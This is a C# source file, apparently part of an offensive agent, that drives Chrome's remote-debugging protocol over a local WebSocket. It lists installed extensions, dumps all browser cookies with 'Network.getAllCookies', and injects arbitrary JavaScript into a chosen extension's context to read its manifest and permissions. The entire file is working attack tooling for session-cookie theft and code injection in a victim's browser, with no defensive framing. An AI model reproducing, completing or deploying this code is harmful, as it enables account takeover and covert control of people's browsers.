using Agent;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Text.Json;
using System.Threading.Tasks;

namespace Agent
{
    internal class DebugHelper
    {
        internal static List<string> GetPermissionsFromManifest(ExtensionManifest manifest)
        {
            List<string> permissions = new List<string>();
            foreach (var permission in manifest.result.value.permissions)
            {
                permissions.Add(permission);
            }

            return permissions;
        }
        internal static async Task<string> InjectGetAllCookies(ChromeJsonObject extension)
        {
            using (var webSocket = new System.Net.WebSockets.ClientWebSocket())
            {
                // Connect to Chrome's WebSocket debugger
                //Need to confirm if this is an okay value
                try
                {
                    await webSocket.ConnectAsync(new Uri(extension.webSocketDebuggerUrl), System.Threading.CancellationToken.None);
                }
                catch
                {
                    return "";
                }

                // Send a message to request cookies
                var message = new
                {
                    id = 1,
                    method = "Network.getAllCookies",
                };
                //Send our request
                string messageJson = JsonSerializer.Serialize(message);
                if(!await WebSocketHelper.TrySendMessage(webSocket, messageJson))
                {
                    return "";
                }

                return await WebSocketHelper.ReceiveMessage(webSocket);
            }
        }
        internal static async Task<string> InjectJs(string id, string jsCode, CursedConfig config)
        {
            var extensions = await GetExtensions(config);

            foreach (var extension in extensions)
            {
                if (extension.id == id)
                {
                    return await InjectJs(jsCode, new Uri(extension.webSocketDebuggerUrl));
                }
            }
            return "Failed to identify specified extension.";
        }
        internal static bool TryInjectJs(ChromeJsonObject extension, string jsCode, out string response)
        {
            response = InjectJs(jsCode, new Uri(extension.webSocketDebuggerUrl)).Result;
            return true;
        }
        internal static async Task<string> InjectJs(string jsCode, Uri uri)
        {
            using (var webSocket = new System.Net.WebSockets.ClientWebSocket())
            {
                try
                {
                    await webSocket.ConnectAsync(uri, System.Threading.CancellationToken.None);
                }
                catch (Exception e)
                {
                    return "Failed to connect to websocket." + Environment.NewLine + e.ToString();
                }

                // Build the DevTools Protocol message to execute JavaScript
                var message = new
                {
                    id = 1,
                    method = "Runtime.evaluate",
                    @params = new
                    {
                        expression = jsCode,
                        returnByValue = true
                    }
                };

                // Convert the message to JSON and send it to the WebSocket
                string messageJson = JsonSerializer.Serialize(message);

                if (!await WebSocketHelper.TrySendMessage(webSocket, messageJson))
                {
                    return "";
                }

                return await WebSocketHelper.ReceiveMessage(webSocket);
            }
        }
        internal static async Task<List<ChromeJsonObject>> GetExtensions(CursedConfig config)
        {
            List<ChromeJsonObject> extensions = new List<ChromeJsonObject>();
            using (HttpClient client = new HttpClient())
            {
                try
                {
                    // Fetch list of targets from DevTools Protocol
                    string targetsUrl = $"http://localhost:{config.debug_port}/json/list";
                    string targetsJson = await client.GetStringAsync(targetsUrl);

                    List<ChromeJsonObject> targets = JsonSerializer.Deserialize<List<ChromeJsonObject>>(targetsJson);

                    foreach (var target in targets)
                    {
                        if (target.url.StartsWith("chrome-extension"))
                        {
                            extensions.Add(target);
                        }
                    }
                }
                catch (Exception e)
                {
                    Console.WriteLine(e.ToString());
                }
            }
            return extensions;
        }
        internal static bool TryGetManifestFromExtension(ChromeJsonObject extension, string task_id, out ExtensionManifest manifest)
        {
            manifest = new ExtensionManifest();

            if (!TryInjectJs(extension, "chrome.runtime.getManifest()", out var response))
            {
                return false;
            }

            JsonDocument responseJsonDocument;

            try
            {
                responseJsonDocument = JsonDocument.Parse(response);
            }
            catch (Exception e)
            {
                return false;
            }

            JsonElement responseRoot = responseJsonDocument.RootElement;


            if (!responseRoot.TryGetProperty("result", out JsonElement resultElement))
            {
                return false;
            }

            try
            {
                manifest = JsonSerializer.Deserialize<ExtensionManifest>(resultElement.GetRawText());
                return true;
            }
            catch
            {
                return false;
            }
        }
    }
}
